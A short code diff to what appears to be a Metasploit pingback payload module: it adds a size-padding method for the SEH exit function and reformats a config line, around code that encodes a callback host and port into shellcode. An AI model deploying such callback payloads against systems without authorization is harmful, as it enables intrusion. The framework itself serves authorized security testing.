@@ -32,6 +32,16 @@ module MetasploitModule
       'Session'       => Msf::Sessions::Pingback
     ))
 
+    def required_space
+      # Start with our cached default generated size
+      space = cached_size
+
+      # EXITFUNK 'seh' is the worst case, that adds 15 bytes
+      space += 15
+
+      space
+    end
+
     def generate_stage
       encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
       encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || "127.127.127.127").unpack("V").first
@@ -40,7 +50,7 @@ module MetasploitModule
       pingback_sleep = datastore['PingbackSleep']
       self.pingback_uuid ||= self.generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
-      conf = {exitfunk:   datastore['EXITFUNC']}
+      conf = { exitfunk: datastore['EXITFUNC'] }
 
       asm = %Q^
         cld                    ; Clear the direction flag.
